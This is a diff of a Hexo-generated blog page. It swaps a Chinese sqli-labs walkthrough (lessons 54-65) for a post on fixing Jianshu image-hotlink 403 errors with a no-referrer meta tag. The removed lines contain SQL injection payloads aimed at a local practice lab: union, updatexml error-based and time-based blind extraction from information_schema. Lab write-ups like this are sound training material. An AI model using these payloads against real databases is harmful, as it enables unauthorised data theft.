@@ -21,11 +21,11 @@
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        Sqli-labs实验Task4（less54-65）｜R_song&#39;s blog
+        简书文章图片外链403问题｜R_song&#39;s blog
         
     </title>
 
-    <link rel="canonical" href="http://rliyuqing.github.io/2019/04/15/9. Sqli-lab实验Task4（less54-65）/">
+    <link rel="canonical" href="http://rliyuqing.github.io/2019/04/15/30.简书文章图片外链403问题/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -156,7 +156,7 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>Sqli-labs实验Task4（less54-65）</h1>
+                    <h1>简书文章图片外链403问题</h1>
                     
                     <span class="meta">
                          作者 折戟
@@ -166,7 +166,7 @@
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#sqli-labs" title="sqli-labs">sqli-labs</a>
+                        <a class="tag" href="/tags/#其他" title="其他">其他</a>
                         
                     </div>
                 </div>
@@ -175,7 +175,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            Sqli-labs实验Task4（less54-65）
+            简书文章图片外链403问题
         </span>
     </div>
 </header>
@@ -186,40 +186,22 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <p><meta name="referrer" content="no-referrer"></p>
-<h1 id="Sqli-labs实验Task4（less54-65）"><a href="#Sqli-labs实验Task4（less54-65）" class="headerlink" title="Sqli-labs实验Task4（less54-65）"></a>Sqli-labs实验Task4（less54-65）</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>Page 4又是不一样的挑战：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-a1cffad6074984f6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"><br>可以看到这一串英文的提示是告诉我们需要在不到10次尝试中从数据库challenges中的随机表中获取秘钥，有趣的是，每次都会重置，challenge都会产生随机的表名、列名、表数据。一直保持新鲜。<br>分析分析可以知道，这个和ctf差不多，我们需要获取flag来提交才算成功。<br>首先第一次判断闭合情况，一次成功，单引号闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=1’</span><br></pre></td></tr></table></figure></p>
-<p>知道数据库名是challenges，下面获取表名：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6269327-a6241fcbf6640597.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"><br>获取了表名，果然是随机产生的，现在获取字段：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,column_name from information_schema.columns where table_name='</span>8al0pvg8mg<span class="string">' and table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6269327-06ae708b48b40d3c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"><br>可以看到第一个字段是id，还是直接获取所有列名把，有点蠢，以为一次就能出：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>8al0pvg8mg<span class="string">' and table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6269327-db7cee15feb21ce2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"><br>根据观察列名应该就是第三个secet_IKU1后面几位应该就是随机产生的，哈哈现在获取flag了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select id,sessid,secret_IKU1 from challenges.8al0pvg8mg -- #</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6269327-1421a3be8fe22b3a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.PNG"><br>哈哈哈，后面直接提交就可以了啦！透个底，作者第一次成功的次数是8次，这个是第二次写博客的时候重新测试的。</p>
-<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一个和上一个差不多，不过将次数增加到了14次，可见难度肯定又有上升了！先来看看闭合情况：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-55/?id=1) -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
-<p>没有报错，很难受，就一个括号的闭合，我竟然猜了6次！！！！！太浪费了，太浪费了。后面就差不多了。54的payload可以直接用，更改一下闭合就行了。最后9次才出来，有点丢人。</p>
-<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>同样是14次，按照之前的套路，这个时候应该是一个有报错的双重闭合。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-56/?id=1<span class="string">') -- #</span></span><br></pre></td></tr></table></figure></p>
-<p>单引号加括号，没意思，大家可以自己玩玩。</p>
-<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>我猜应该也是不同的闭合，每次套餐四个不是吗？<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-57/?id=1<span class="string">" -- #</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一次就给力了，只有5次机会，这就基本要保证我们每一次都不能出现错误。<br>测试了一下还是单引号闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-58/?id=1<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
-<p>试一下54的payload发现不行！这样不行，那就得换方法了，发现可以报错，试试我们之前的updatexml的报错看看：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-58/?id=1<span class="string">' and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">')),1))-- #</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6269327-2fbee840c7552ba2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.PNG"><br>成功，但是次数不够了，尴尬，只能重开一局了。<br>后面的话就直接修改updatexml里面的第二个参数的查询语句就可以啦，我就不废话了。</p>
-<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>这个比上面那个还简单，没有闭合。根据报错可以看出：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-59/?id=1 and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">'challenges'</span>)),1))-- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>和上面一样，闭合情况改为了双引号加括号：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-60/?id=1<span class="string">") -- #</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>哇，这一次，我没有试出来，看了源码才弄出来闭合。。。。头皮发麻，单引号加两重括号，这第一次见：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-61/?id=1<span class="string">')) -- #</span></span><br></pre></td></tr></table></figure></p>
-<p>其他的就和之前的一样。</p>
-<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>我的天，这一次让我们130次的机会，我猜现在肯定就只能利用布尔的盲注，不然照实验这么抠的，怎么会给130次机会。。<br>可以看到，现在没有报错，只能自己猜闭合情况，然后union联合查询也没用，只能利用布尔盲注。<br>闭合是单引号加括号。<br>尝试获取信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-62/?id=1<span class="string">') and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">'),1,1))=79,0,sleep(10)) -- #</span></span><br></pre></td></tr></table></figure></p>
-<p>这个时候肯定就只能利用脚本了。大家可以用sqlmap试试，我这里就没弄了。</p>
-<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>这个和62一样，不过闭合变成了单引号。</p>
-<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>这个也一样，闭合变成了双重括号！！！</p>
-<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>双引号加括号！</p>
-<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>本来看sqli-lab的分布图应该是有到less-75的，但是一直也没有找到，就暂且不论了。还有这次的sqli-lab的实验过程中，基本都是手动做的，因此很多需要布尔，时间的盲注的less都没有好好弄，之后有时间会整理出一套用工具的教程来完善一下。<br>就像我的学长曾经指导我一样，他没有具体去教我如何学习渗透，学习注入的知识，他很鄙视渗透，甚至都不愿教我们，但他又承认，这是安全工作者必备的技能。<br>安全学习过程中，路漫漫其修远兮！</p>
+                <h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="简书文章图片外链403问题"><a href="#简书文章图片外链403问题" class="headerlink" title="简书文章图片外链403问题"></a>简书文章图片外链403问题</h1><hr>
+<p>最近刚上研，所以事情比较多，一直没有注意到自己<a href="http://www.raosong.cc" target="_blank" rel="noopener">博客</a>的图片都无法访问了，都是403，后面了解才发现是简书对图片外链设置了限制，简单来说就是做了个根据http请求头中的referrer的值来验证请求是不是来自本站，如果不是就返回403或者重定向之类的。<br>可以看到简书这么做很明显是因为大部分人都把简书当做图床或者云笔记的平台来使用，高额的服务器费用，却没有代理经济价值，没有办法，只能通过这种方法来限制“白嫖用户”。<br>说说具体情况吧，我的博客是github上使用hexo搭建的，然后在简书写，写完同步到个人博客上的，简书的这个措施直接影响到我个人博客的使用了，那就只能改改呗。经过测试简书和微博的图片外链在referrer值为空也是可以访问的，所以他们的策略是只要你带了其他站点的信息就403，所以我们只要设置页面的referrer值为空就行。看了看网上的说法<br><img src="https://upload-images.jianshu.io/upload_images/6269327-37ca5e73fc4ae388.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>直接在文章里面添加<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"no-referrer"</span>/&gt;</span><br></pre></td></tr></table></figure></p>
+<p>确实是个方法，但是我的文章太多了，一个一个加太麻烦了，而且我主页上还有图片呢，既然是hexo，直接生成静态页面的，那就直接改配置文件就行。<br>在themes/主题/layout路径里面找到生成页面的ejs文件，然后会有个head之类的ejs文件，在这里面加上上面的代码就行：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b3fa80672d620df9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可能会在下面的子目录里面，或者其他的配置文件，具体看代码怎么写的。改好之后hexo d -g就行啦。最近写的比较少了，后面会慢慢继续开始记录一下东西了。<br>不知道后面简书或者其他的平台对于图片外链会有其他的限制手段，只能见招拆招了，不过应该做的这就以及是一个取舍的平衡了，要是真的把图片外链限制的死死的那就真的会损是很多用户的吧，所以我对这事还是挺方向的，毕竟我也不是白嫖党。</p>
 
                 <hr>
                 
 
                 <ul class="pager">
                     
+                    <li class="previous">
+                        <a href="/2019/04/15/9. Sqli-lab实验Task4（less54-65）/" data-toggle="tooltip" data-placement="top" title="Sqli-labs实验Task4（less54-65）">&larr; Previous Post</a>
+                    </li>
+                    
                     
                     <li class="next">
-                        <a href="/2019/04/15/30.简书文章图片外链403问题/" data-toggle="tooltip" data-placement="top" title="简书文章图片外链403问题">Next Post &rarr;</a>
+                        <a href="/2019/04/15/29.python3 windows校园网自动拨号/" data-toggle="tooltip" data-placement="top" title="python3 windows校园网自动拨号">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -235,8 +217,8 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-labs实验Task4（less54-65）"><span class="toc-text">Sqli-labs实验Task4（less54-65）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-54"><span class="toc-text">Less-54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-55"><span class="toc-text">Less-55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-56"><span class="toc-text">Less-56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-57"><span class="toc-text">Less-57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-58"><span class="toc-text">Less-58</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-59"><span class="toc-text">Less-59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-60"><span class="toc-text">Less-60</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-61"><span class="toc-text">Less-61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-62"><span class="toc-text">Less-62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-63"><span class="toc-text">Less-63</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-64"><span class="toc-text">Less-64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-65"><span class="toc-text">Less-65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结束语"><span class="toc-text">结束语</span></a></li></ol></li></ol>
-                </div>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-text"></span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#简书文章图片外链403问题"><span class="toc-text">简书文章图片外链403问题</span></a>
+                </li></div>
             </div>
         </div>
 
@@ -257,7 +239,7 @@
                     </h5>
                     <div class="tags">
                         
-                        <a class="tag" href="/tags/#sqli-labs" title="sqli-labs">sqli-labs</a>
+                        <a class="tag" href="/tags/#其他" title="其他">其他</a>
                         
                     </div>
                 </section>
